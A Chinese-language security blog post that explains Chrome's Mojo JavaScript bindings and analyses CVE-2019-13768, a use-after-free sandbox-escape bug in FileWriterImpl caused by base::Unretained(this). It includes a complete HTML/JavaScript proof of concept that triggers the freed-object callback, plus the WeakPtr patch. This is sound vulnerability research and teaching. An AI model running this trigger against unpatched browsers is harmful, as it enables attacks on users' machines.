> 原文链接: https://www.anquanke.com//post/id/231411 


# Chrome UAF漏洞模式浅析（一）：user-defined callback


                                阅读量   
                                **202587**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01f3390ae30c31598a.jpg)](https://p3.ssl.qhimg.com/t01f3390ae30c31598a.jpg)



## 前序

本系列将简述一些chrome里相对经久不衰的UAF漏洞模式，并配以一个具体的漏洞分析。



## 基础知识

Chromium通过mojo来在不同的进程之间实现通信，具体的细节参考[官方文档](https://chromium.googlesource.com/chromium/src/+/master/mojo/README.md)，这里笔者仅将我们需要用到的mojo js IDL部分单独摘出，以供参考。

### <a class="reference-link" name="Mojo%20JavaScript%20Bindings%20API"></a>Mojo JavaScript Bindings API

#### <a class="reference-link" name="Getting%20Started"></a>Getting Started

bindings API被定义在mojo namespace里，其实现在[mojo_bindings.js](https://source.chromium.org/chromium/chromium/src/+/master:out/Debug/gen/mojo/public/js/mojo_bindings.js)

当bindings generator处理mojom IDL文件时，将会生成对应的mojom.js文件。

假设我们创建一个`//services/echo/public/interfaces/echo.mojom`文件和`//services/echo/public/interfaces/BUILD.gn`

```
module test.echo.mojom;

interface Echo `{`
  EchoInteger(int32 value) =&gt; (int32 result);
`}`;
```

```
import("//mojo/public/tools/bindings/mojom.gni")

mojom("interfaces") `{`
  sources = [
    "echo.mojom",
  ]
`}`
```

通过构建如下生成target，来生成bindings。
- foo_js JavaScript bindings; 被用在compile-time dependency.
- foo_js_data_deps JavaScript bindings; 被用在run-time dependency.
如果我们编译这个target,这将生成几个source file

```
ninja -C out/r services/echo/public/interfaces:interfaces_js
```

其中与js binding相关的是

```
out/gen/services/echo/public/interfaces/echo.mojom.js
```

为了使用echo.mojom中的定义，您将需要使用`&lt;script&gt;`标签在html页面中包括两个文件：
- mojo_bindings.js: 注意这个文件必须放在所有的`.mojom.js`文件之前。
- echo.mojom.js
```
&lt;!DOCTYPE html&gt;
&lt;script src="URL/to/mojo_bindings.js"&gt;&lt;/script&gt;
&lt;script src="URL/to/echo.mojom.js"&gt;&lt;/script&gt;
&lt;script&gt;

var echoPtr = new test.echo.mojom.EchoPtr();
var echoRequest = mojo.makeRequest(echoPtr);
// ...

&lt;/script&gt;
```

#### <a class="reference-link" name="Interfaces"></a>Interfaces

和C++ bindings API相同的是，我们有
<li>
`mojo.InterfacePtrInfo`和`mojo.InterfaceRequest`封装message pipe的两端，他们分别代表interface连接的client端和service端</li>
- 对于每个Mojom interface Foo，这也生成一个FooPtr类，它保存一个InterfacePtrInfo，提供了使用InterfacePtrInfo中的message pipe handle发送interface call的方法。
<li>
`mojo.Binding`保存一个InterfaceRequest。 它侦听message pipe handle，并将传入的message分发到user-defined的interface实现。</li>
让我们考虑上面的echo.mojom示例。下面显示了如何创建Echo interface connection和使用它进行call。

```
&lt;!DOCTYPE html&gt;
&lt;script src="URL/to/mojo_bindings.js"&gt;&lt;/script&gt;
&lt;script src="URL/to/echo.mojom.js"&gt;&lt;/script&gt;
&lt;script&gt;

function EchoImpl() `{``}`
EchoImpl.prototype.echoInteger = function(value) `{`
  return Promise.resolve(`{`result: value`}`);
  // Promise.resolve('foo')
  // 粗略可以理解成，但注意这并不严格等价，只是在这里可以这么理解
  // new Promise(resolve =&gt; resolve('foo'))
`}`;

var echoServicePtr = new test.echo.mojom.EchoPtr();
var echoServiceRequest = mojo.makeRequest(echoServicePtr);
var echoServiceBinding = new mojo.Binding(test.echo.mojom.Echo,
                                          new EchoImpl(),
                                          echoServiceRequest);
echoServicePtr.echoInteger(`{`value: 123`}`).then(function(response) `{`
  console.log('The result is ' + response.result);
`}`);

&lt;/script&gt;
```

##### <a class="reference-link" name="Interface%20Pointer%20and%20Request"></a>Interface Pointer and Request

在上面的示例中,test.echo.mojom.EchoPtr是一个interface pointer类，它代表interface connection的client。对于Echo Mojom接口中的方法EchoInteger，在EchoPtr中定义了相应的echoInteger方法（注意，生成的method name的格式为camelCaseWithLowerInitial,即小驼峰,第一个字母小写)

这就是实际生成的[echo.mojom.js](https://source.chromium.org/chromium/chromium/src/+/master:out/win-Debug/gen/mojo/public/interfaces/bindings/tests/echo.mojom.js)

在上面的实例中，echoServiceRequest是一个InterfaceRequest实例，它代表接口连接的server。

mojo.makeRequest创建一个message pipe，用pipe的一端填充output参数（可以是InterfacePtrInfo或interface pointer）,返回包装在InterfaceRequest实例中的另一端。

```
// |output| could be an interface pointer, InterfacePtrInfo or
  // AssociatedInterfacePtrInfo.
  function makeRequest(output) `{`
    if (output instanceof mojo.AssociatedInterfacePtrInfo) `{`
      var `{`handle0, handle1`}` = internal.createPairPendingAssociation();
      output.interfaceEndpointHandle = handle0;
      output.version = 0;

      return new mojo.AssociatedInterfaceRequest(handle1);
    `}`

    if (output instanceof mojo.InterfacePtrInfo) `{`
      var pipe = Mojo.createMessagePipe();
      output.handle = pipe.handle0;
      output.version = 0;

      return new mojo.InterfaceRequest(pipe.handle1);
    `}`

    var pipe = Mojo.createMessagePipe();
    output.ptr.bind(new mojo.InterfacePtrInfo(pipe.handle0, 0));
    return new mojo.InterfaceRequest(pipe.handle1);
  `}`
```

##### <a class="reference-link" name="Binding%20an%20InterfaceRequest"></a>Binding an InterfaceRequest

mojo.Binding桥接了interface的实现和message pipe的一端，从而将传入的message从server端分派到该实现。

在上面的示例中，echoServiceBinding侦听message pipe上的传入的EchoInteger方法调用，并将这些调用分派到EchoImpl实例。

```
// ---------------------------------------------------------------------------

  // |request| could be omitted and passed into bind() later.
  //
  // Example:
  //
  //    // FooImpl implements mojom.Foo.
  //    function FooImpl() `{` ... `}`
  //    FooImpl.prototype.fooMethod1 = function() `{` ... `}`
  //    FooImpl.prototype.fooMethod2 = function() `{` ... `}`
  //
  //    var fooPtr = new mojom.FooPtr();
  //    var request = makeRequest(fooPtr);
  //    var binding = new Binding(mojom.Foo, new FooImpl(), request);
  //    fooPtr.fooMethod1();
  function Binding(interfaceType, impl, requestOrHandle) `{`
    this.interfaceType_ = interfaceType;
    this.impl_ = impl;
    this.router_ = null;
    this.interfaceEndpointClient_ = null;
    this.stub_ = null;

    if (requestOrHandle)
      this.bind(requestOrHandle);
  `}`
  ...
  ...
    Binding.prototype.bind = function(requestOrHandle) `{`
    this.close();

    var handle = requestOrHandle instanceof mojo.InterfaceRequest ?
        requestOrHandle.handle : requestOrHandle;
    if (!(handle instanceof MojoHandle))
      return;

    this.router_ = new internal.Router(handle);

    this.stub_ = new this.interfaceType_.stubClass(this.impl_);
    this.interfaceEndpointClient_ = new internal.InterfaceEndpointClient(
        this.router_.createLocalEndpointHandle(internal.kPrimaryInterfaceId),
        this.stub_, this.interfaceType_.kVersion);

    this.interfaceEndpointClient_ .setPayloadValidators([
        this.interfaceType_.validateRequest]);
  `}`;
```

##### <a class="reference-link" name="Receiving%20Responses"></a>Receiving Responses

一些mojom接口期待response，例如EchoInteger，对应的js方法返回一个Promise，当service端发回响应时，此Promise将被resolve，如果interface断开连接，则将被reject。



## CVE-2019-13768 Chrome sandbox escape漏洞分析

[https://bugs.chromium.org/p/project-zero/issues/detail?id=1755](https://bugs.chromium.org/p/project-zero/issues/detail?id=1755)

### <a class="reference-link" name="Root%20Cause"></a>Root Cause

该漏洞发生在Chrome的FileWriterImpl接口实现上。

首先我们先看一下FileWriter的IDL接口描述

```
// Interface provided to the renderer to let a renderer write data to a file.
interface FileWriter `{`
 // Write data from |blob| to the given |position| in the file being written
 // to. Returns whether the operation succeeded and if so how many bytes were
 // written.
 // TODO(mek): This might need some way of reporting progress events back to
 // the renderer.
 Write(uint64 position, Blob blob) =&gt; (mojo_base.mojom.FileError result,
                                       uint64 bytes_written);    //&lt;-----------bug case

 // Write data from |stream| to the given |position| in the file being written
 // to. Returns whether the operation succeeded and if so how many bytes were
 // written.
 // TODO(mek): This might need some way of reporting progress events back to
 // the renderer.
 WriteStream(uint64 position, handle&lt;data_pipe_consumer&gt; stream) =&gt;
       (mojo_base.mojom.FileError result, uint64 bytes_written);

 // Changes the length of the file to be |length|. If |length| is larger than
 // the current size of the file, the file will be extended, and the extended
 // part is filled with null bytes.
 Truncate(uint64 length) =&gt; (mojo_base.mojom.FileError result);
`}`;
```

而FileWriter是被FileSystemManager管理的，其有一个CreateWriter方法，可以创建出FileWriter。

[![](https://p1.ssl.qhimg.com/t013cc3117e475455ae.jpg)](https://p1.ssl.qhimg.com/t013cc3117e475455ae.jpg)

`MakeRequest`接收一个`FileWriterPtr writer`作为参数，创建一个message pipe，并将返回pipe的receiver端。而这里pipe的remote端就和`FileWriterPtr writer`绑定，等receiver端和FileWriterImpl实例绑定后，就可以通过writer来调用FileWriterImpl里的方法。

然后这里就通过`MakeStrongBinding`来将FileWriterImpl实例和刚刚创建出来的receiver绑定到一起，**此时FileWriterImpl的生命周期和message pipe绑定，只要message pipe不断开，则FileWriterImpl永远不会被释放**。

**所以我们可以用断开message pipe的方法来析构掉这个对象，这也是生命周期管理不严谨的一种表现，FileWrite并没有被FileSystemManager来管理它的生命周期**

然后通过`std::move(callback).Run`来将`FileWriterPtr writer`作为response返回给CreateWriter的调用者，这样调用者就可以通过writer来调用FileWriterImpl实例里的方法`FileWriterImpl::Write`了。

```
// Interface provided by the browser to the renderer to carry out filesystem
// operations. All [Sync] methods should only be called synchronously on worker
// threads (and asynchronously otherwise).
interface FileSystemManager `{`
 // ...

 // Creates a writer for the given file at |file_path|.
 CreateWriter(url.mojom.Url file_path) =&gt;
     (mojo_base.mojom.FileError result,
      blink.mojom.FileWriter? writer);

 // ...
`}`;
```

```
void FileSystemManagerImpl::CreateWriter(const GURL&amp; file_path,
                                        CreateWriterCallback callback) `{`
 DCHECK_CURRENTLY_ON(BrowserThread::IO);
...
 blink::mojom::FileWriterPtr writer;
 mojo::MakeStrongBinding(std::make_unique&lt;storage::FileWriterImpl&gt;(
                             url, context_-&gt;CreateFileSystemOperationRunner(),
                             blob_storage_context_-&gt;context()-&gt;AsWeakPtr()),
                         MakeRequest(&amp;writer));
 std::move(callback).Run(base::File::FILE_OK, std::move(writer));
`}`
```

从mojo接口可以看出`FileWriterImpl::Write`的第二个参数是一个BlobPtr。**注意我们是可以在js层构造一个BlobPtr传入的**

这里的`base::BindOnce(&amp;FileWriterImpl::DoWrite, base::Unretained(this), std::move(callback), position));`其实就是创建一个callback对象，在callback执行的时候，它将调用`FileWriterImpl::DoWrite`函数，并依次传入`base::Unretained(this),std::move(callback), position)`作为参数，对应于`this,WriteCallback callback,uint64_t position`

Write将调用GetBlobDataFromBlobPtr函数，并将一个**用户可控的blob**和`FileWriterImpl::DoWrite` callback传入，这里记做callback1。

```
void FileWriterImpl::Write(uint64_t position,
                          blink::mojom::BlobPtr blob,
                          WriteCallback callback) `{`
 blob_context_-&gt;GetBlobDataFromBlobPtr(
     std::move(blob),
     base::BindOnce(&amp;FileWriterImpl::DoWrite, base::Unretained(this),
                    std::move(callback), position));
`}`
...
void FileWriterImpl::DoWrite(WriteCallback callback,
                             uint64_t position,
                             std::unique_ptr&lt;BlobDataHandle&gt; blob) `{`
  ...
`}`
```

最后我们来看一下GetBlobDataFromBlobPtr函数，其调用**raw_blob-&gt;GetInternalUUID**函数，因为blob是我们传入的，所以GetInternalUUID也是对应我们自己定义好的js函数，它只需要满足mojo idl接口即可，将一个`string uuid`作为response返回。

**此时我们就可以回调到js里，并在js函数GetInternalUUID里将之前建立好的message pipe给断开，从而析构掉之前创建出的FileWriterImpl对象**

```
// This interface provides access to a blob in the blob system.
interface Blob `{`
 // Creates a copy of this Blob reference.
 Clone(Blob&amp; blob);
// This method is an implementation detail of the blob system. You should not
 // ever need to call it directly.
 // This returns the internal UUID of the blob, used by the blob system to
 // identify the blob.
 GetInternalUUID() =&gt; (string uuid);
`}`
...
...
  function BlobImpl() `{`
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  `}`

  BlobImpl.prototype = `{`
    clone: async (arg0) =&gt; `{`
      console.log('clone');
    `}`,
    asDataPipeGetter: async (arg0, arg1) =&gt; `{`
      console.log("asDataPipeGetter");
    `}`,
    readAll: async (arg0, arg1) =&gt; `{`
      console.log("readAll");
    `}`,
    readRange: async (arg0, arg1, arg2, arg3) =&gt; `{`
      console.log("readRange");
    `}`,
    readSideData: async (arg0) =&gt; `{`
      console.log("readSideData");
    `}`,
    getInternalUUID: async (arg0) =&gt; `{`
      console.log("getInternalUUID");
      create_writer_result.writer.ptr.reset();
      return `{`'uuid': 'blob_0'`}`;
    `}`
  `}`;
```

回到`raw_blob-&gt;GetInternalUUID`，其参数是一个callback，这里记做callback2，callback2最终就是调用callback1，并将从uuid得到的BlobData，作为callback1，即DoWrite的最后一个参数`std::unique_ptr&lt;BlobDataHandle&gt; blob`。

```
...
void BlobStorageContext::GetBlobDataFromBlobPtr(
    blink::mojom::BlobPtr blob,
    base::OnceCallback&lt;void(std::unique_ptr&lt;BlobDataHandle&gt;)&gt; callback) `{`
  DCHECK(blob);
  blink::mojom::Blob* raw_blob = blob.get();
  raw_blob-&gt;GetInternalUUID(mojo::WrapCallbackWithDefaultInvokeIfNotRun(
      base::BindOnce(
          [](blink::mojom::BlobPtr, base::WeakPtr&lt;BlobStorageContext&gt; context,
             base::OnceCallback&lt;void(std::unique_ptr&lt;BlobDataHandle&gt;)&gt; callback,
             const std::string&amp; uuid) `{`
            ...
            std::move(callback).Run(context-&gt;GetBlobDataFromUUID(uuid));
          `}`,//---&gt; 类似于函数指针
          std::move(blob), AsWeakPtr(), std::move(callback)),
      ""));
`}`
```

现在我们将调用callback1回调`FileWriterImpl::DoWrite`，而此时，因为FileWriterImpl实例已经在回调到js里时析构掉了，所以就触发了UAF。

[![](https://p5.ssl.qhimg.com/t014b45e17d8a14aaad.jpg)](https://p5.ssl.qhimg.com/t014b45e17d8a14aaad.jpg)

这个漏洞的一个关键就是callback1的参数`base::Unretained(this)`，被Unretained修饰的this指针，只由回调的调用者来保证回调执行时，this指针仍然可用。

这里如果换成WeakPtr，那么在this被析构后，回调就不会被执行。

### <a class="reference-link" name="poc"></a>poc

```
&lt;html&gt;
  &lt;body&gt;
    &lt;script src="/mojo_bindings.js"&gt;&lt;/script&gt;
    &lt;script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"&gt;&lt;/script&gt;
    &lt;script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"&gt;&lt;/script&gt;
    &lt;script&gt;
(async function poc() `{`
  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                     mojo.makeRequest(blob_registry_ptr).handle, "process");

  function BytesProviderImpl() `{`
    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
  `}`

  BytesProviderImpl.prototype = `{`
    requestAsReply: async () =&gt; `{`
      console.log('requestAsReply');
    `}`,
    requestAsStream: async (arg0) =&gt; `{`
      console.log('requestAsStream');
    `}`,
    requestAsFile: async (arg0, arg1, arg2, arg3) =&gt; `{`
      console.log('requestAsFile');
    `}`
  `}`;

  base_bytes = new BytesProviderImpl();
  base_bytes_ptr = new blink.mojom.BytesProviderPtr();
  base_bytes.binding.bind(mojo.makeRequest(base_bytes_ptr));

  let base_blob_element = new blink.mojom.DataElement();
  base_blob_element.bytes = new blink.mojom.DataElementBytes();
  base_blob_element.bytes.length = 2;
  base_blob_element.bytes.embeddedData = [0x41, 0x41];
  base_blob_element.bytes.data = base_bytes_ptr;

  let base_blob_ptr = new blink.mojom.BlobPtr();
  let base_blob_req = mojo.makeRequest(base_blob_ptr);
  blob_registry_ptr.register(base_blob_req, "blob_0", "text/html", "", [base_blob_element]);

  let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                   mojo.makeRequest(file_system_manager_ptr).handle, "process");

  let host_url = new url.mojom.Url();
  host_url.url = 'http://localhost:7007';

  let open_result = await file_system_manager_ptr.open(host_url, 0);
  console.log(open_result);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/pwned';

  let create_writer_result = await file_system_manager_ptr.createWriter(file_url);
  console.log(create_writer_result);

  function BlobImpl() `{`
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  `}`

  BlobImpl.prototype = `{`
    clone: async (arg0) =&gt; `{`
      console.log('clone');
    `}`,
    asDataPipeGetter: async (arg0, arg1) =&gt; `{`
      console.log("asDataPipeGetter");
    `}`,
    readAll: async (arg0, arg1) =&gt; `{`
      console.log("readAll");
    `}`,
    readRange: async (arg0, arg1, arg2, arg3) =&gt; `{`
      console.log("readRange");
    `}`,
    readSideData: async (arg0) =&gt; `{`
      console.log("readSideData");
    `}`,
    getInternalUUID: async (arg0) =&gt; `{`
      console.log("getInternalUUID");
      create_writer_result.writer.ptr.reset();
      return `{`'uuid': 'blob_0'`}`;
    `}`
  `}`;

  let blob_impl = new BlobImpl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));

  create_writer_result.writer.write(0, blob_impl_ptr);
`}`)();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;

```

### <a class="reference-link" name="patch"></a>patch

```
blob_context_-&gt;GetBlobDataFromBlobPtr(
       std::move(blob),
-      base::BindOnce(&amp;FileWriterImpl::DoWrite, base::Unretained(this),
+      base::BindOnce(&amp;FileWriterImpl::DoWrite, weak_ptr_factory_.GetWeakPtr(),
                      std::move(callback), position));
```

补丁就是把`base::Unretained(this)`换成了`weak_ptr_factory_.GetWeakPtr()`，这样如果当前FileWriterImpl实例被析构掉了，则`&amp;FileWriterImpl::DoWrite`回调不会被调用。



## 后记

本篇主要是笔者以前分析漏洞时候的笔记摘录修改，如有不明确之处，欢迎斧正。
